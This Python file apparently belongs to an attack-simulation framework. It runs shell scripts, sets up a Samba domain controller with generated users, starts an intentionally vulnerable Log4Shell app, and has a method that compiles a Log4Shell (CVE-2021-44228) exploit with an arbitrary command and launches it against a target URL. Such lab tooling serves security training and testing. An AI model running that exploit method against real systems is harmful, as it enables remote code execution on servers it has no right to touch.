import os
import string
import random
import signal
import subprocess
from pathlib import Path
from shutil import copyfile, rmtree

class Trainman:

    def __init__(self):
        self.args = None
        self.host_info = None
        self.results = None
        self.exec_process = None
        self.realm = None
        self.admin_password = None
        self.samba_process = None
        self.samba_users = None
        self.java_version = None
        self.cve_2021_44228_process = None

    def set_args(self, args, attack_ip, hostname, local_ip):
        self.args = args
        self.host_info = [attack_ip, hostname] + local_ip
        return True

    def execute_process(self):
        if 'file_path' not in self.args:
            output = {'outcome': 'failed', 'message': 'instruct_args must specify file_name', 'forward_log': 'False'}
            return output
        file_path = Path(self.args['file_path'])
        if 'options' in self.args:
            cmd = self.args['options']
            if isinstance(cmd, list):
                cmd.insert(0, file_path)
                cmd.insert(0, 'bash')
            else:
                output = {'outcome': 'failed', 'message': 'options must be a list', 'forward_log': 'False'}
                return output
        else:
            cmd = ['bash', file_path]
        if file_path.is_file():
            self.exec_process = subprocess.Popen(
                cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
        else:
            output = {'outcome': 'failed', 'message': 'file not found', 'forward_log': 'False'}
            return output

        if self.exec_process:
            output = {'outcome': 'success', 'message': 'file executed', 'forward_log': 'True'}
        else:
            output = {'outcome': 'failed', 'message': 'file execution failed', 'forward_log': 'True'}
        return output

    def get_process_output(self):
        if not self.exec_process:
            output = {'outcome': 'failed', 'message': 'no process is running', 'forward_log': 'False'}
            return output
        process_output = self.exec_process.stdout.read()
        output = {'outcome': 'success', 'process_output': process_output, 'forward_log': 'True'}
        return output

    def kill_process(self):
        if not self.exec_process:
            output = {'outcome': 'failed', 'message': 'no process is running', 'forward_log': 'False'}
            return output
        self.exec_process.terminate()
        output = {'outcome': 'success', 'message': 'process killed', 'forward_log': 'True'}
        return output

    def run_ad_dc(self):
        if 'domain' not in self.args:
            output = {'outcome': 'failed', 'message': 'instruct_args must specify domain', 'forward_log': 'False'}
            return output
        domain = self.args['domain']
        if 'realm' not in self.args:
            output = {'outcome': 'failed', 'message': 'instruct_args must specify realm', 'forward_log': 'False'}
            return output
        self.realm = self.args['realm']
        if 'admin_password' not in self.args:
            output = {
                'outcome': 'failed', 'message': 'instruct_args must specify admin_password', 'forward_log': 'False'
            }
            return output
        self.admin_password = self.args['admin_password']
        if 'user_name' not in self.args:
            output = {
                'outcome': 'failed', 'message': 'instruct_args must specify user_name', 'forward_log': 'False'
            }
            return output
        user_name = self.args['user_name']
        if 'user_password' not in self.args:
            output = {
                'outcome': 'failed', 'message': 'instruct_args must specify user_password', 'forward_log': 'False'
            }
            return output
        user_password = self.args['user_password']
        os.rename('/etc/samba/smb.conf', '/etc/samba/smb.conf.bak')
        provision_cmd = [
            'samba-tool', 'domain', 'provision', '--server-role=dc', '--use-rfc2307', '--dns-backend=SAMBA_INTERNAL',
            f'--realm={self.realm.upper()}', f'--domain={domain}', f'--adminpass={self.admin_password}'
        ]
        provision = subprocess.Popen(
            provision_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        provision_output = provision.communicate()[0].decode('ascii')
        if provision_output:
            output = {'outcome': 'failed', 'message': provision_output, 'forward_log': 'False'}
            return output
        config_kerberos =  subprocess.Popen(['cp', '/var/lib/samba/private/krb5.conf', '/etc/krb5.conf'],
                                            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        config_kerberos.communicate()
        share_perms_cmd = [
            'printf',
            '\n[users]\n\tpath = /opt/havoc/users/\n\tread only = no\n\tpublic = yes\n\twriteable = yes\n\t'
            'browseable = yes\n'
        ]
        with open('/etc/samba/smb.conf', 'a') as s_file:
            share_perms_add = subprocess.Popen(share_perms_cmd, stdout=s_file)
            share_perms_add.communicate()
        self.samba_process = subprocess.Popen(
            ['samba', '-F'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        if not self.samba_process:
            output = {'outcome': 'failed', 'message': 'running Samba AD DC failed', 'forward_log': 'True'}
            return output
        resolv_cmd = {
            'name_server': ['echo', 'nameserver 127.0.0.1'],
            'search': ['echo', f'search {self.realm.lower()}']
        }
        with open('/etc/resolv.conf', 'w') as r_file:
            subprocess.Popen(resolv_cmd['name_server'], stdout=r_file)
        with open('/etc/resolv.conf', 'a') as r_file:
            subprocess.Popen(resolv_cmd['search'], stdout=r_file)
        split_ip = self.host_info[2].split('.')
        in_addr_arpa = f'{split_ip[3]}.{split_ip[2]}.{split_ip[1]}.{split_ip[0]}.in-addr.arpa'
        dns_zone_cmd = ['samba-tool', 'dns', 'zonecreate', self.realm.lower(), in_addr_arpa, '-U', 'Administrator',
                        f'--password={self.admin_password}']
        config_zone = subprocess.Popen(
            dns_zone_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        config_zone_output = config_zone.communicate()[0].decode('ascii')
        if config_zone_output:
            output = {'outcome': 'failed', 'message': config_zone_output, 'forward_log': 'False'}
            return output
        dns_add_cmd = [
            'samba-tool', 'dns', 'add', f'{self.host_info[1]}.{self.realm.lower()}', in_addr_arpa, split_ip[3], 'PTR',
            f'{self.host_info[1]}.{self.realm.lower()}', '-U Administrator', f'--password={self.admin_password}'
        ]
        config_dns_add = subprocess.Popen(
            dns_add_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        config_dns_add_output = config_dns_add.communicate()[0].decode('ascii')
        if config_dns_add_output:
            output = {'outcome': 'failed', 'message': config_dns_add_output, 'forward_log': 'False'}
            return output
        names_file = open('/opt/havoc/names.txt')
        names = names_file.readlines()
        names_file.close()
        name_count = 0
        self.samba_users = []
        while name_count <= 20:
            self.samba_users.append(user_name)
            user_add_cmd = [
                'samba-tool', 'user', 'create', user_name, user_password,
                f'--home-directory=\\\\{self.host_info[1]}.{self.realm.lower()}\\{user_name}'
            ]
            user_add = subprocess.Popen(
                user_add_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            user_add_output = user_add.communicate()[1].decode('ascii')
            if user_add_output:
                output = {'outcome': 'failed', 'message': user_add_output, 'forward_log': 'False'}
                return output
            if not os.path.exists(f'/opt/havoc/users/{user_name}'):
                os.makedirs(f'/opt/havoc/users/{user_name}')
            folder_perms_cmd = [
                'printf',
                f'\n[{user_name}]\n\tpath = /opt/havoc/users/{user_name}\n\tvalid users = {user_name}\n\t'
                f'browseable = no\n'
            ]
            with open('/etc/samba/smb.conf', 'a') as s_file:
                folder_perms_add = subprocess.Popen(folder_perms_cmd, stdout=s_file)
                folder_perms_add.communicate()
            copyfile('/opt/havoc/sample-data.csv', f'/opt/havoc/users/{user_name}/sample-data.csv')
            copyfile('/opt/havoc/test-5mb.bin', f'/opt/havoc/users/{user_name}/test-5mb.bin')
            name_count += 1
            initial = ''.join(random.choice(string.ascii_letters) for i in range(1)).lower()
            user_name = f'{initial}{names[random.randrange(999)].strip().lower()}'
        subprocess.Popen(
            ['smbcontrol', 'smbd', 'reload-config'],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        output = {'outcome': 'success', 'message': 'Samba AD DC is running', 'forward_log': 'True'}
        return output

    def kill_ad_dc(self):
        if not self.samba_process:
            output = {'outcome': 'failed', 'message': 'no Samba process is running', 'forward_log': 'False'}
            return output
        for user_name in self.samba_users:
            user_delete_cmd = ['samba-tool', 'user', 'delete', user_name]
            user_delete = subprocess.Popen(
                user_delete_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            user_delete_output = user_delete.communicate()[1].decode('ascii')
            if user_delete_output:
                output = {'outcome': 'failed', 'message': user_delete_output, 'forward_log': 'False'}
                return output
            rmtree(f'/opt/havoc/users/{user_name}')
        split_ip = self.host_info[2].split('.')
        in_addr_arpa = f'{split_ip[3]}.{split_ip[2]}.{split_ip[1]}.{split_ip[0]}.in-addr.arpa'
        dns_delete_cmd = [
            'samba-tool', 'dns', 'delete', f'{self.host_info[1]}.{self.realm.lower()}', in_addr_arpa, split_ip[3], 'PTR',
            f'{self.host_info[1]}.{self.realm.lower()}', '-U Administrator', f'--password={self.admin_password}'
        ]
        config_dns_delete = subprocess.Popen(
            dns_delete_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        config_dns_delete_output = config_dns_delete.communicate()[0].decode('ascii')
        if config_dns_delete_output:
            output = {'outcome': 'failed', 'message': config_dns_delete_output, 'forward_log': 'False'}
            return output
        dns_zone_cmd = ['samba-tool', 'dns', 'zonedelete', self.realm.lower(), in_addr_arpa, '-U', 'Administrator',
                        f'--password={self.admin_password}']
        config_zone = subprocess.Popen(
            dns_zone_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        config_zone_output = config_zone.communicate()[0].decode('ascii')
        if config_zone_output:
            output = {'outcome': 'failed', 'message': config_zone_output, 'forward_log': 'False'}
            return output
        resolv_cmd = ['echo', 'nameserver 1.1.1.1']
        with open('/etc/resolv.conf', 'w') as r_file:
            subprocess.Popen(resolv_cmd, stdout=r_file)
        self.samba_process.terminate()
        os.remove('/etc/samba/smb.conf')
        os.rename('/etc/samba/smb.conf.bak', '/etc/samba/smb.conf')
        output = {'outcome': 'success', 'message': 'Samba process killed', 'forward_log': 'True'}
        return output

    def list_java_versions(self):
        list_java_cmd = ['/root/.jabba/bin/jabba', 'ls-remote']
        list_java = subprocess.Popen(
            list_java_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        list_java_output = list_java.communicate()[0].decode('ascii').strip().split('\n')
        output = {'outcome': 'success', 'java_versions': list_java_output, 'forward_log': 'False'}
        return output

    def start_cve_2021_44228_app(self):
        if 'java_version' in self.args:
            self.java_version = self.args['java_version']
        else:
            output = {'outcome': 'failed', 'message': 'Missing java_version', 'forward_log': 'False'}
            return output
        if 'listen_port' in self.args:
            port = self.args['listen_port']
        else:
            output = {'outcome': 'failed', 'message': 'Missing port', 'forward_log': 'False'}
            return output
        env = {}
        env.update(os.environ)
        jvm_install_cmd = ['/root/.jabba/bin/jabba', 'install', self.java_version]
        jvm_install = subprocess.Popen(
            jvm_install_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
        )
        jvm_install_output = jvm_install.communicate()[1].decode('ascii')
        os.environ['JAVA_HOME'] = f'/root/.jabba/jdk/{self.java_version}'
        os.environ['PATH'] = os.environ['PATH'] + f':/root/.jabba/jdk/{self.java_version}/bin'
        env.update(os.environ)
        java_version_cmd = ['java', '-version']
        try:
            java_version = subprocess.Popen(
                java_version_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
            )
            java_version_output = java_version.communicate()[0].decode('ascii')
            if java_version_output:
                output = {
                    'outcome': 'failed',
                    'message': f'Java install failed - {java_version_output}',
                    'forward_log': 'False'
                }
                return output
        except:
            output = {
                'outcome': 'failed', 'message': f'Java install failed - {jvm_install_output}', 'forward_log': 'False'
            }
            return output
        log4j_cmd = f'java -jar /log4shell-vulnerable-app/spring-boot-application.jar --server.port={port}'
        self.cve_2021_44228_process = subprocess.Popen(
            log4j_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            env=env,
            preexec_fn=os.setsid
        )
        counter = 1
        output = None
        for app_line in self.cve_2021_44228_process.stdout:
            if b'JVM running for' in app_line:
                output = {'outcome': 'success', 'message': 'cve_2021_44228_app is running', 'forward_log': 'True'}
                break
            if not output and counter == 35:
                output = {
                    'outcome': 'failed',
                    'message': 'cve_2021_44228_app executed but failed to start',
                    'forward_log': 'True'
                }
                os.killpg(os.getpgid(self.cve_2021_44228_process.pid), signal.SIGTERM)
                jvm_uninstall_cmd = ['/root/.jabba/bin/jabba', 'uninstall', self.java_version]
                subprocess.Popen(
                    jvm_uninstall_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
                )
                break
            counter += 1
        return output

    def stop_cve_2021_44228_app(self):
        if not self.cve_2021_44228_process:
            output = {'outcome': 'failed', 'message': 'no cve_2021_44228_app is running', 'forward_log': 'False'}
            return output
        os.killpg(os.getpgid(self.cve_2021_44228_process.pid), signal.SIGTERM)
        jvm_uninstall_cmd = ['/root/.jabba/bin/jabba', 'uninstall', self.java_version]
        subprocess.Popen(jvm_uninstall_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = {'outcome': 'success', 'message': 'cve_2021_44228_app stopped', 'forward_log': 'True'}
        return output

    def exploit_cve_2021_44228(self):
        if 'callback' in self.args:
            callback = self.args['callback']
        else:
            callback = {self.host_info[2]}
        if 'target_url' in self.args:
            target_url = self.args['target_url']
        else:
            output = {'outcome': 'failed', 'message': 'Missing target_url', 'forward_log': 'False'}
            return output
        if 'http_port' in self.args:
            http_port = self.args['http_port']
        else:
            output = {'outcome': 'failed', 'message': 'Missing http_port', 'forward_log': 'False'}
            return output
        if 'ldap_port' in self.args:
            ldap_port = self.args['ldap_port']
        else:
            output = {'outcome': 'failed', 'message': 'Missing ldap_port', 'forward_log': 'False'}
            return output
        if 'exec_cmd' in self.args:
            exec_cmd = self.args['exec_cmd']
        else:
            output = {'outcome': 'failed', 'message': 'Missing exec_cmd', 'forward_log': 'False'}
            return output
        env = {}
        env.update(os.environ)
        jvm_install_cmd = '/root/.jabba/bin/jabba install openjdk-ri@1.8.41'
        subprocess.Popen(
            jvm_install_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, env=env
        )
        os.environ['JAVA_HOME'] = '/root/.jabba/jdk/openjdk-ri@1.8.41'
        os.environ['PATH'] = os.environ['PATH'] + ':/root/.jabba/jdk/openjdk-ri@1.8.41/bin'
        env.update(os.environ)
        exploit_template = open('/L4sh/db/template.java', 'r')
        exploit_code = exploit_template.read().replace('CMDGOESHERE', exec_cmd)
        exploit_template.close()
        exploit_java = open('/tmp/Main.java', 'w')
        exploit_java.write(exploit_code)
        exploit_java.close()
        build_exploit_cmd = '/root/.jabba/jdk/openjdk-ri@1.8.41/bin/javac /tmp/Main.java'
        build_exploit = subprocess.Popen(
            build_exploit_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            env=env
        )
        build_exploit_output, build_exploit_error = build_exploit.communicate()
        if build_exploit_error:
            output = {
                'outcome': 'failed',
                'message': 'Build for exploit_cve_2021_44228 failed. '
                           f'stdout: {build_exploit_output.decode()}, '
                           f'stderr: {build_exploit_error.decode()}',
                'forward_log': 'False'
            }
            return output
        exploit_cve_2021_44228_cmd = \
            f'python3 main.py -i {self.host_info[2]} -e {callback} -u {target_url} -c {exec_cmd} -p {http_port} ' \
            f'-l {ldap_port}'
        exploit_cve_2021_44228 = subprocess.Popen(
            exploit_cve_2021_44228_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True,
            env=env,
            cwd=r'/L4sh',
            preexec_fn=os.setsid
        )
        try:
            exploit_cve_2021_44228_output, exploit_cve_2021_44228_error = exploit_cve_2021_44228.communicate(timeout=30)
        except:
            os.killpg(os.getpgid(exploit_cve_2021_44228.pid), signal.SIGTERM)
            exploit_cve_2021_44228_output, exploit_cve_2021_44228_error = exploit_cve_2021_44228.communicate()
        if exploit_cve_2021_44228_output:
            if 'New HTTP Request 200' in exploit_cve_2021_44228_output.decode():
                output = {
                    'outcome': 'success',
                    'message': 'exploit_cve_2021_44228 succeeded. '
                               f'stdout: {exploit_cve_2021_44228_output.decode()},'
                               f'stderr: {exploit_cve_2021_44228_error.decode()}',
                    'forward_log': 'True'
                }
            else:
                output = {
                    'outcome': 'failed',
                    'message': 'exploit_cve_2021_44228 executed but failed to exploit target. '
                               f'stdout: {exploit_cve_2021_44228_output.decode()}, '
                               f'stderr: {exploit_cve_2021_44228_error.decode()}',
                    'forward_log': 'True'
                }
        else:
            output = {
                'outcome': 'failed',
                'message': 'exploit_cve_2021_44228 execution failed. '
                            f'stdout: {exploit_cve_2021_44228_output.decode()}, '
                            f'stderr: {exploit_cve_2021_44228_error.decode()}',
                'forward_log': 'True'
            }
        return output

    def echo(self):
        match = {
            'foo': 'bar',
            'bar': 'baz',
            'ping': 'pong',
            'and then': 'no more and then',
            'pen testing is dead': 'long live pen testing',
            'never gonna give you up': 'never gonna let you down, never gonna run around and desert you',
            'never gonna make you cry': 'never gonna say goodbye, never gonna tell a lie and hurt you'
        }

        if 'echo' in self.args:
            echo = self.args['echo']
            if echo in match:
                output = {'outcome': 'success', 'echo': match[echo], 'forward_log': 'False'}
            else:
                output = {'outcome': 'success', 'echo': 'OK', 'forward_log': 'False'}
        else:
            output = {'outcome': 'success', 'echo': 'OK', 'forward_log': 'False'}

        return output
